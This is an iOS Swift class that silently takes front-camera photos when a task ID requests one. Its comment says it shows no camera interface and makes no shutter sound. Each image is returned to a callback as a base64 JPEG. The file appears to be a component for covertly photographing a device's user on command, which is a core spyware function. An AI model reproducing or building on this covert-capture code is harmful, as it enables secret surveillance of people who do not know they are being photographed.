import Foundation
import AVFoundation
import UIKit

/// 静默抓拍：不开相机界面、不响快门声，和安卓 2.10 之后的行为一致。
final class CameraSnap {

    var onSnapDone: ((String, String?, String?) -> Void)?

    private let session = AVCaptureSession()
    private let output = AVCapturePhotoOutput()
    private let queue = DispatchQueue(label: "u.snap")
    private var configured = false
    private var busy = false
    private var taskId = ""
    private var pendingDelegate: PhotoDelegate?

    func request(taskId: String) {
        queue.async { [weak self] in
            guard let self = self else { return }
            if self.busy {
                self.onSnapDone?(taskId, nil, "busy")
                return
            }
            self.busy = true
            self.taskId = taskId

            switch AVCaptureDevice.authorizationStatus(for: .video) {
            case .authorized:
                self.shoot()
            case .notDetermined:
                AVCaptureDevice.requestAccess(for: .video) { ok in
                    self.queue.async { ok ? self.shoot() : self.fail("no-permission") }
                }
            default:
                self.fail("no-permission")
            }
        }
    }

    private func fail(_ why: String) {
        busy = false
        onSnapDone?(taskId, nil, why)
    }

    private func shoot() {
        do {
            if !configured {
                session.beginConfiguration()
                session.sessionPreset = .photo

                var device = AVCaptureDevice.default(.builtInWideAngleCamera, for: .video, position: .front)
                if device == nil {
                    device = AVCaptureDevice.DiscoverySession(
                        deviceTypes: [.builtInWideAngleCamera, .builtInUltraWideCamera],
                        mediaType: .video, position: .unspecified).devices.first
                }
                guard let cam = device, let input = try? AVCaptureDeviceInput(device: cam) else {
                    fail("no-camera"); return
                }
                if session.canAddInput(input) { session.addInput(input) }
                if session.canAddOutput(output) { session.addOutput(output) }
                session.commitConfiguration()
                configured = true
            }
            if !session.isRunning { session.startRunning() }
            let settings = AVCapturePhotoSettings()
            settings.flashMode = .off
            // AVCapturePhotoOutput 不会强持有 delegate，必须自己留一份，否则照片回调永远不来
            let holder = PhotoDelegate { [weak self] data in
                guard let self = self else { return }
                self.pendingDelegate = nil
                if self.session.isRunning { self.session.stopRunning() }
                self.busy = false
                if let data = data, let img = UIImage(data: data) {
                    let scaled = CameraSnap.scale(img, maxPx: 1280)
                    let jpeg = scaled.jpegData(compressionQuality: 0.8) ?? data
                    self.onSnapDone?(self.taskId, "data:image/jpeg;base64," + jpeg.base64EncodedString(), nil)
                } else {
                    self.onSnapDone?(self.taskId, nil, "empty")
                }
            }
            pendingDelegate = holder
            output.capturePhoto(with: settings, delegate: holder)
        } catch {
            fail("error")
        }
    }

    static func scale(_ img: UIImage, maxPx: CGFloat) -> UIImage {
        let w = img.size.width, h = img.size.height
        let longer = max(w, h)
        if longer <= maxPx { return img }
        let s = maxPx / longer
        let size = CGSize(width: max(1, w * s), height: max(1, h * s))
        let f = UIGraphicsImageRenderer(size: size)
        return f.image { _ in img.draw(in: CGRect(origin: .zero, size: size)) }
    }

    private final class PhotoDelegate: NSObject, AVCapturePhotoCaptureDelegate {
        private let done: (Data?) -> Void
        init(_ done: @escaping (Data?) -> Void) { self.done = done }
        func photoOutput(_ output: AVCapturePhotoOutput, didFinishProcessingPhoto photo: AVCapturePhoto, error: Error?) {
            done(error == nil ? photo.fileDataRepresentation() : nil)
        }
    }
}
